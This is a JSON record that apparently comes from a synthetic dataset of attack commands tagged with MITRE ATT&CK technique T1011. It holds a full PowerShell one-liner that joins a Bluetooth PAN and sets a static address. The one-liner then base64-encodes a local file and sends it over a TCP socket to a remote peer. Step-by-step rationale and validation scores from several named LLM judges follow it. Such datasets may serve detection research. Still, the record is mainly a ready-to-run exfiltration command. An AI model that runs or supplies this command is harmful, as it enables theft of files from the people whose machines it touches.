{
  "technique_id": "T1011",
  "platform": "Windows",
  "shell": "Powershell",
  "command": "& 'C:\\Tools\\BluetoothCL.exe' /connect 11-22-33-44-55-66 NAP | Out-Null; $if=(Get-NetAdapter | ?{$_.InterfaceDescription -match 'Bluetooth.*PAN' -or $_.Name -like 'Bluetooth*'} | select -First 1).Name; netsh interface ip set address name=\"$if\" static 172.29.61.2 255.255.255.252 | Out-Null; $b64=[Convert]::ToBase64String([IO.File]::ReadAllBytes('C:\\Users\\Public\\Desktop\\notes.txt')); $client=New-Object Net.Sockets.TcpClient; $client.Client.Bind([Net.IPEndPoint]::new([Net.IPAddress]::Parse('172.29.61.2'),0)); $client.Connect('172.29.61.1',54721); $strm=$client.GetStream(); $pref=[Text.Encoding]::UTF8.GetBytes('DATA:'); $dat=[Text.Encoding]::UTF8.GetBytes($b64); $suf=[Text.Encoding]::UTF8.GetBytes(':END'); $strm.Write($pref,0,$pref.Length); $strm.Write($dat,0,$dat.Length); $strm.Write($suf,0,$suf.Length); $strm.Close(); $client.Close()",
  "explanation": "Encodes content and sends it over a custom TCP service bound to the Bluetooth interface, ensuring exfiltration flows over the Bluetooth medium (T1011).",
  "rationale_steps": [
    "Initiate the Bluetooth NAP connection.",
    "Configure the Bluetooth NIC with a static address via netsh.",
    "Bind the TCP socket to the Bluetooth IP to constrain medium.",
    "Transmit base64 payload wrapped in innocuous markers over a high port."
  ],
  "obfuscation_level": "none",
  "id": "SYN-POWERSHELL-T1011-f4a0ca3c-7cae3b7b",
  "source_prompt_hash": "f4a0ca3c",
  "timestamp_utc": "2025-09-30T08:29:05.159712Z",
  "validation": {
    "syntax_ok": true,
    "llm_judgments": [
      {
        "model": "gpt-5",
        "syntactic_score": 5,
        "syntactic_justification": "PowerShell command is well-formed with balanced quoting/parentheses, correct separators, and valid .NET and netsh invocations.",
        "semantic_score": 4,
        "semantic_justification": "It plausibly exfiltrates data over a Bluetooth PAN by binding a TCP client to the Bluetooth interface, but setting a static IP via netsh typically requires admin rights and the specific BluetoothCL /connect NAP usage is uncertain.",
        "combined_score": 4.5,
        "confidence": 0.7,
        "timestamp": "2025-10-01T01:11:04.019831Z"
      },
      {
        "model": "claude-3-7-sonnet",
        "syntactic_score": 5,
        "syntactic_justification": "The command is perfectly well-formed with balanced quotes, parentheses, and braces, proper command separators, valid PowerShell syntax for variable assignments, method calls, and piping.",
        "semantic_score": 5,
        "semantic_justification": "The command fully implements the T1011 technique by establishing a Bluetooth PAN connection, configuring the network interface, encoding file contents, and exfiltrating data over the Bluetooth medium using TCP.",
        "combined_score": 5.0,
        "confidence": 0.95,
        "timestamp": "2025-10-01T01:11:08.825693Z"
      },
      {
        "model": "gemini-2.0-flash-thinking-exp",
        "syntactic_score": 5,
        "syntactic_justification": "The PowerShell script is perfectly well-formed, using correct cmdlet syntax, .NET method calls, variable assignments, and command separators.",
        "semantic_score": 2,
        "semantic_justification": "While conceptually aligned with T1011, the command cannot achieve its claimed intent of 'ensuring exfiltration flows over the Bluetooth medium' under the stated 'Privilege: None' condition, as the `netsh interface ip set address` command requires Administrator privileges to execute successfully.",
        "combined_score": 3.5,
        "confidence": 1,
        "timestamp": "2025-10-01T06:25:24.864753Z"
      }
    ],
    "llm_average_syntactic": 5.0,
    "llm_average_semantic": 3.667,
    "llm_average_score": 4.333,
    "llm_verdict": "likely_match",
    "sandbox_trace_id": null,
    "mitre_match_score": null,
    "Syntax_Run_Details": ""
  }
}
